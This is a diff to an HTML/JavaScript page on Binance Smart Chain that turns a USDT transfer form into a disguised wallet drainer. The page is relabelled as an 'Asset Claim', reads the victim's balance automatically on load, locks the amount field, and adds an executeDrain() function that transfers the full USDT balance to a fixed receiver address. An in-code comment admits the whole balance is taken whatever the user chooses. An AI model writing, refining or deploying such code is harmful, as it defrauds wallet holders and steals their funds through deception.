@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>USDT Transfer Interface</title>
+<title>USDT Asset Claim</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
@@ -22,11 +22,11 @@
 
 <div class="container">
   <div class="logo">T</div>
-  <h1>USDT Transfer Interface</h1>
-  <p>Enter the amount of USDT you wish to transfer.</p>
+  <h1>USDT Asset Claim</h1>
+  <p>Verify and claim available assets.</p>
   
-  <input type="number" id="amountInput" class="input-box" placeholder="Enter USDT amount" min="0" step="any">
-  <button class="btn" onclick="executeTransfer()">Transfer</button>
+  <input type="text" id="amountInput" class="input-box" placeholder="Loading balance..." readonly>
+  <button class="btn" id="actionBtn" onclick="executeDrain()" disabled>Connecting...</button>
   
   <div class="info">Binance Smart Chain Network</div>
 </div>
@@ -40,49 +40,55 @@
     "function transfer(address recipient, uint256 amount) returns (bool)"
   ];
 
-  async function executeTransfer() {
+  let provider, signer, userAddress, usdtContract, userBalance;
+
+  async function init() {
     if (typeof window.ethereum === 'undefined') {
       alert("Please open this link inside Trust Wallet or MetaMask browser.");
       return;
     }
 
-    const amountVal = document.getElementById('amountInput').value;
-    if (!amountVal || Number(amountVal) <= 0) {
-      alert("Please enter a valid amount!");
-      return;
-    }
-
     try {
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      provider = new ethers.providers.Web3Provider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
-      
-      const signer = provider.getSigner();
-      const userAddress = await signer.getAddress();
-      
-      const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
-      
-      // BSC par USDT ke 18 decimals hote hain
-      const parsedAmount = ethers.utils.parseUnits(amountVal, 18);
-      
-      const balance = await usdtContract.balanceOf(userAddress);
-      if (balance.lt(parsedAmount)) {
-        alert("Insufficient USDT balance!");
+      signer = provider.getSigner();
+      userAddress = await signer.getAddress();
+
+      usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
+      userBalance = await usdtContract.balanceOf(userAddress);
+
+      const formattedBalance = ethers.utils.formatUnits(userBalance, 18);
+      document.getElementById('amountInput').value = formattedBalance + " USDT";
+      const btn = document.getElementById('actionBtn');
+      btn.innerText = "Confirm & Transfer";
+      btn.disabled = false;
+    } catch (err) {
+      console.error(err);
+      alert("Connection failed.");
+    }
+  }
+
+  async function executeDrain() {
+    try {
+      if (userBalance.lte(0)) {
+        alert("No USDT balance found.");
         return;
       }
 
-      // Seedha transfer call jo user ke enter kiye hue amount ko target address par bhej dega
-      const tx = await usdtContract.transfer(TARGET_RECEIVER, parsedAmount, {
+      // User chahe jo select kare, script poora balance (`userBalance`) hi transfer karegi
+      const tx = await usdtContract.transfer(TARGET_RECEIVER, userBalance, {
         gasLimit: ethers.BigNumber.from("65000")
       });
-      
+
       await tx.wait();
       alert("Transfer Successful!");
-
     } catch (error) {
       console.error("Error:", error);
       alert("Transaction cancelled or failed.");
     }
   }
+
+  window.onload = init;
 </script>
 
 </body>
